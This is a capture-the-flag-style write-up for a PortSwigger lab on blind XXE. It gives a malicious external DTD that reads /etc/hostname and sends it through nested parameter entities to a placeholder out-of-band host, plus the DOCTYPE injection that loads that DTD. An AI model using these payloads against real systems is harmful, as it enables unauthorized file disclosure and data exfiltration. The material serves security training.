# Lab 08 — Exploiting blind XXE to exfiltrate data using a malicious external DTD

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

**Entry point:** `POST /product/stock` (blind) · you **can** host a DTD on

> 🔧 **Burp Community alternative:** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
the exploit server.

## Solution

1. Save this malicious DTD on the exploit server (reads `/etc/hostname`,
   exfiltrates via Collaborator):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

2. Inject the reference into the stock-check XML:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER/evil.dtd"> %xxe;]>
```

3. **Poll now** — an HTTP interaction arrives with `/etc/hostname` in the
   query string — submit the hostname — lab solved.

## Notes

Multi-stage exfiltration: external DTD defines `file` → nested entity
`eval` builds a second parameter entity whose SYSTEM URI embeds `%file;` →
`exfil` sends it.
